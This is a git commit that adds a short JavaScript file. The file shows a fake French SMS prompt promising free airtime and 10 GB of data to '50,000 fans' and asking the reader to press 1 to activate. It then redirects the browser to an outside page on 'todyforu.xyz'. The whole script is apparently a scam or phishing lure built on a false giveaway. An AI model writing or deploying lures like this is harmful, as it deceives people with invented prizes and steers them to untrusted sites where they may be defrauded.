28b53a1843b334a63d2aca5f54a12c51d983c87e
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-10-01 04:06:20 -0700

    Create activation-wyclefjean2024.js

---
+++ activation-wyclefjean2024.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('SMS: Félicitations, vous faites partie des 50 000 fans qui recevront 1 000 FC de temps d'antenne et 10 Go de données gratuites. Veuillez appuyer sur 1 pour ACTIVER ','1');
+if (password != '1') {
+location.href='https://todyforu.xyz/wyclefjean2024.html';
+}
